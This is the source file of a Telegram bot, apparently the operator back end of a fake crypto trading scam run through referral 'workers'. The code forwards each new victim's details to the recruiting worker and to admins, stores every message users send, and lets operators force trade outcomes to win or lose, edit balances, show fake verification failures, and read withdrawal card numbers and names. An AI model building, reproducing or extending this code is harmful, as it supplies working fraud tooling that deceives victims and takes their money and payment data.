import { serve } from "https://deno.land/std@0.131.0/http/server.ts";
import { Bot, webhookCallback, InlineKeyboard, Keyboard } from "https://deno.land/x/grammy@v1.8.3/mod.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
console.log(`Function "telegram-bot-main" up and running!`);
const supabaseUrl = Deno.env.get("URL") || "";
const supabaseKey = Deno.env.get("KEY") || "";
const supabase = createClient(supabaseUrl, supabaseKey);
const bot = new Bot(Deno.env.get("BOT_TOKEN"));
const bot2 = new Bot(Deno.env.get("BOT_TOKEN2"));


var Messages;
(function(Messages) {
  Messages["Welcome"] = "Добро пожаловать!";
  Messages["NoDataFound"] = "No data found123";
  
  Messages["RefURL"] = "https://t.me/nexo_ru_bot?start=";
  Messages["SelectAction"] = "Выберите действие:";
  
  Messages["TradingEnabled"] = "Trading enabled";
  Messages["TradingDisabled"] = "Trading disabled";

  Messages["Enabled"] = "enabled";
})(Messages || (Messages = {}));
var ButtonLabels;
(function(ButtonLabels) {
  ButtonLabels["Unlink"] = "Отвязать";
  ButtonLabels["AutoRefill"] = "Автопополнение";
  ButtonLabels["CreateChecks"] = "Создание чеков";
  ButtonLabels["Trading"] = "Торговля";
  ButtonLabels["Profile"] = "Профиль";
  ButtonLabels["HiddenVerification"] = "Вериф_спрятан";
  ButtonLabels["ShovedVerification"] = "Вериф_показан";
  ButtonLabels["VerificationFailed"] = "Вериф_не_пройден";
  ButtonLabels["VerificationPassed"] = "Вериф_пройден";
  ButtonLabels["WithdrawalAllowed"] = "Вывод_разрешен";
  ButtonLabels["Unbanned"] = "Разбанен";
  ButtonLabels["Deposits"] = "Депозиты";
  ButtonLabels["Withdrawals"] = "Выводы";
  ButtonLabels["Exchanges"] = "Обмены";
  ButtonLabels["Checks"] = "Чеки";
  ButtonLabels["Deals"] = "Сделки";
  ButtonLabels["Balances"] = "Балансы";
  ButtonLabels["Notification"] = "Уведомление";
  ButtonLabels["Off"] = "Off";
  ButtonLabels["Win"] = "Win";
  ButtonLabels["Lose"] = "Lose";
  ButtonLabels["Users"] = "Користувачі";
  ButtonLabels["Link"] = "Посилання";
  ButtonLabels["ON_SPAM"] = "Spam";
  ButtonLabels["ChangeUSDT"] = "Изменить_USDT";
  ButtonLabels["ChangeRUB"] = "Изменить_RUB";
  ButtonLabels["Send_Message"] = "Відправити_повідомлення";
})(ButtonLabels || (ButtonLabels = {}));
bot.command("start", async (ctx)=>{
  const startMessage = ctx.message.text;
  const refID = startMessage.split(' ')[1];
  const chat_id = ctx.message.chat.id;
  const { data: user, error } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
  if (error) {
    if (error.code === 'PGRST116') {
      // Автоматично блокуємо користувачів, які зайшли без реферального посилання
      const shouldBlock = !refID || refID === 'undefined' || refID.trim() === '';
      
      const { error: insertError, data: user } = await supabase.from('users').insert({
        chat_id,
        ref_id: refID,
        username: ctx.message.chat.username,
        first_name: ctx.message?.chat?.first_name || '',
        blocked: shouldBlock
      }).select();
      console.log('New user:', user);
      const keyboard = new InlineKeyboard().text('Details', `details ${user[0].chat_id}`);
      const { data, error } = await supabase.from('users').select('*').eq('chat_id', user[0].ref_id).single();
      const message = `Новий користувач: ${user[0]?.username} - ${user[0]?.first_name} ${user[0]?.chat_id}, worker: @${data?.username} \n ${data?.first_name} \n ${data?.worker_comment}`;
      const recipients = [
        7561947088,
        7184660397,
        6993432791
      ];
      if (user[0].ref_id) {
        bot2.api.sendMessage(user[0]?.ref_id, `Новий користувач: ${user[0]?.username} - ${user[0]?.first_name}`, {
          reply_markup: keyboard
        });
      }
      for (const recipient of recipients){
        bot2.api.sendMessage(recipient, message, {
          reply_markup: keyboard
        });
      }
      if (insertError) {
        console.error(insertError);
        return;
      }
    } else {
      console.error(error);
      return;
    }
  }
  const keyboard = new Keyboard().text('Далее').row();
  await ctx.reply(Messages.Welcome, {
    reply_markup: keyboard
  });
});
bot.on("message:text", async (ctx)=>{
  const message = ctx.message.text;
  const chat_id = ctx.message.chat.id;
  console.log(ctx);
  
  // Отримуємо користувача для доступу до ref_id
  const { data: user, error: userError } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
  
  // Збереження повідомлення користувача в таблицю messages
  // from - відправник (chat_id користувача), to - одержувач (ref_id воркера або 'bot')
  // Не зберігаємо повідомлення "Далее" в базу
  if (message !== 'Далее') {
    try {
      const recipientId = user?.ref_id || 'bot';
      const { error: messageError } = await supabase
        .from('messages')
        .insert({
          from: String(chat_id),
          to: String(recipientId),
          message: message
        });

      if (messageError) {
        console.error('Error saving user message to database:', messageError);
      }
    } catch (error) {
      console.error('Error saving message:', error);
    }
  }
  
  if (message === 'Далее') {
    if (userError) {
      console.error(userError);
      return;
    }
    const keyboard = new Keyboard().webApp("Торговля", `https://web-app-nine-opal.vercel.app/?chat_id=${chat_id}`);
    ctx.reply('Нажмите кнопку ниже, чтобы открыть торговый интерфейс:', {
      reply_markup: keyboard
    });
  }
});
bot.on("callback_query:data", async (ctx)=>{
  const [data, chat_id, amount] = ctx.callbackQuery.data.split(' ');
  const updateUserBalance = async (currency, amount, id)=>{
    const column = currency === 'rub' ? 'rub_amount' : 'usdt_amount';
    const { error } = await supabase.from('users').update({
      [column]: parseFloat(amount)
    }).eq('id', id);
    if (!error) {
      ctx.reply('Баланс змінено');
    }
  };
  const createKeyboard = (chat_id, user)=>{
    return new InlineKeyboard().text(ButtonLabels.Unlink, `${ButtonLabels.Unlink} ${chat_id} `).text(ButtonLabels.AutoRefill, `${chat_id} ${ButtonLabels.AutoRefill}`).row().text(ButtonLabels.CreateChecks, `${chat_id} ${ButtonLabels.CreateChecks}`).text(`${ButtonLabels.Trading} ${user['is_trading_enable'] ? '🟢' : '🔴'}`, `${ButtonLabels.Trading} ${chat_id}`).row().text(!user["verification_on"] ? ButtonLabels.HiddenVerification : ButtonLabels.ShovedVerification, `${!user["verification_on"] ? ButtonLabels.HiddenVerification : ButtonLabels.ShovedVerification} ${chat_id}`).text(user["verification_needed"] ? ButtonLabels.VerificationFailed : ButtonLabels.VerificationPassed, `${user["verification_needed"] ? ButtonLabels.VerificationFailed : ButtonLabels.VerificationPassed} ${chat_id} `).row().text(ButtonLabels.WithdrawalAllowed, `${chat_id} ${ButtonLabels.WithdrawalAllowed}`).text(ButtonLabels.Unbanned, `${chat_id} ${ButtonLabels.Unbanned}`).row().text(ButtonLabels.Deposits, `${chat_id} ${ButtonLabels.Deposits}`).text(ButtonLabels.Withdrawals, `${ButtonLabels.Withdrawals} ${chat_id}`).text(ButtonLabels.Exchanges, `${chat_id} ${ButtonLabels.Exchanges}`).row().text(ButtonLabels.Checks, `${chat_id} ${ButtonLabels.Checks}`).text(ButtonLabels.Deals, `${chat_id} ${ButtonLabels.Deals}`).text(ButtonLabels.Balances, `${ButtonLabels.Balances} ${chat_id} `).row().text(ButtonLabels.Notification, `${chat_id} ${ButtonLabels.Notification}`).row().text(`${ButtonLabels.Off} ${user['auto_win'] === null ? '🔵' : ''}`, `${ButtonLabels.Off} ${chat_id}`).text(`${ButtonLabels.Win} ${user['auto_win'] ? '🟢' : ''}`, `${ButtonLabels.Win} ${chat_id}`).text(`${ButtonLabels.Lose} ${user['auto_win'] === false ? '🔴' : ''}`, `${ButtonLabels.Lose} ${chat_id}`).text(`${ButtonLabels.ON_SPAM} ${user['spam'] === true ? '🟢' : '🔴'}`, `${ButtonLabels.ON_SPAM} ${chat_id} `).row().text('Відправити повідомлення', `${ButtonLabels.Send_Message} ${chat_id}`);
  };
  const replyMessage = (user)=>{
    return `Профіль: ${user.first_name} \n 
      Телеграм: @${user.username} \n
      Створений: ${user.created_at} \n 
      Баланси: \n
      Рубли: ${user.rub_amount} \n
      USDT: ${user.usdt_amount} \n 
      Торговля: ${user.is_trading_enable ? 'Увімкнено' : 'Вимкнено'} \n
      Авторезульат ${user.auto_win ? 'Завжди Перемога' : user.auto_win === null ? 'Нейтрально' : 'Завжди програш'} \n
      Верифікація показуваться: ${user.verification_on ? 'Так' : 'Ні'} \n
      Текст верифікації: ${user.verification_needed ? 'Верификация не пройдена' : 'Верификация пройдена'}`;
  };
  if (amount) {
    await updateUserBalance(data.split(' ')[1], amount, data.split(' ')[0]);
  }
  if (data === 'details') {
    const { data: user, error } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    if (error) {
      console.error(error);
      return;
    }
    const keyboard = createKeyboard(chat_id, user);
    const message = replyMessage(user);
    ctx.reply(message, {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.Win,
    ButtonLabels.Lose,
    ButtonLabels.Off
  ].includes(data)) {
    const auto_win = data === ButtonLabels.Win ? true : data === ButtonLabels.Lose ? false : null;
    const { error } = await supabase.from('users').update({
      auto_win
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: user, error: userError } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    if (userError) {
      console.error(userError);
      return;
    }
    const keyboard = createKeyboard(chat_id, user);
    ctx.reply(replyMessage(user), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.Trading) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error } = await supabase.from('users').update({
      is_trading_enable: !user.is_trading_enable
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.ON_SPAM) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const { error } = await supabase.from('users').update({
      spam: !user.spam
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.ShovedVerification,
    ButtonLabels.HiddenVerification
  ].includes(data)) {
    const verification_on = data === ButtonLabels.HiddenVerification;
    const { error } = await supabase.from('users').update({
      verification_on
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if ([
    ButtonLabels.VerificationFailed,
    ButtonLabels.VerificationPassed
  ].includes(data)) {
    const verification_needed = data === ButtonLabels.VerificationPassed;
    const { error } = await supabase.from('users').update({
      verification_needed
    }).eq('chat_id', chat_id);
    if (error) {
      console.error(error);
      return;
    }
    const { data: updatedUser } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    const keyboard = createKeyboard(chat_id, updatedUser);
    ctx.reply(replyMessage(updatedUser), {
      reply_markup: keyboard
    });
  } else if (data === ButtonLabels.Balances) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Баланси: \n USDT: ${user.usdt_amount} \n RUB: ${user.rub_amount} \n Щоб змінити баланс введіть команду ${user.id} rub/usdt amount \n Приклад: ${user.id} rub 1000`);
  } else if ([
    ButtonLabels.ChangeUSDT,
    ButtonLabels.ChangeRUB
  ].includes(data)) {
    const currency = data === ButtonLabels.ChangeUSDT ? 'USDT' : 'RUB';
    ctx.reply(`Введите новое значение ${currency}:`);
  } else if (data === ButtonLabels.Withdrawals) {
    const { data: withdraws } = await supabase.from('withdraws').select('*').eq('chat_id', chat_id);
    if (!withdraws || withdraws.length === 0) {
      ctx.reply('А ніхуя! Виводів немає');
      return;
    }
    withdraws.forEach((withdraw)=>{
      ctx.reply(`Вывод: ${withdraw.amount} ${withdraw.currency} \n Номер карты: ${withdraw.card_number} \n Имя: ${withdraw.name} \n`);
    });
  } else if (data === ButtonLabels.Send_Message) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Щоб надіслати повідомлення введіть команду ${user.id} message <повідомлення> \n Приклад: ${user.id} message Привіт!`);
  } else if (data === ButtonLabels.Unlink) {
    const { data: user } = await supabase.from('users').select('*').eq('chat_id', chat_id).single();
    ctx.reply(`Щоб Видалити куристувача введіть команду ${user.id} delete \n Приклад: ${user.id} delete!`);
  }
});
bot.command('ref', async (ctx)=>{
  const chat_id = ctx.message.chat.id;
  const { data, error } = await supabase.from('users').select('id').eq('chat_id', chat_id).single();
  if (error) {
    console.error(error);
    return;
  }
  if (!data) {
    await ctx.reply(Messages.NoDataFound);
    return;
  }
  const message = `${Messages.RefURL}${chat_id}\n`;
  await ctx.reply(message);
});
const handleUpdate = webhookCallback(bot, "std/http");
serve(async (req)=>{
  try {
    return await handleUpdate(req);
  } catch (err) {
    console.error(err);
  }
});
